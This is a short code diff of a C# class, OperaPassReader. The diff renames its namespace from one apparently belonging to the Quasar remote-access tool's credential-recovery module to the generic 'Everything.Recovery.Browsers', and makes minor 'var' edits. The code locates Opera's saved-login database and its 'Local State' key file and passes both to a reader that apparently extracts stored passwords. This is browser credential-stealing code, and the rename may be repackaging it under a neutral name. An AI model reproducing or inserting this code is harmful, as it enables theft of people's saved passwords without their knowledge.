@@ -3,7 +3,7 @@ using System;
 using System.Collections.Generic;
 using System.IO;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Everything.Recovery.Browsers
 {
     public class OperaPassReader : ChromiumBase
     {
@@ -15,9 +15,9 @@ namespace Quasar.Client.Recovery.Browsers
         {
             try
             {
-                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                var filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     "Opera Software\\Opera Stable\\Login Data");
-                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                var localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                     "Opera Software\\Opera Stable\\Local State");
                 return ReadAccounts(filePath, localStatePath);
             }
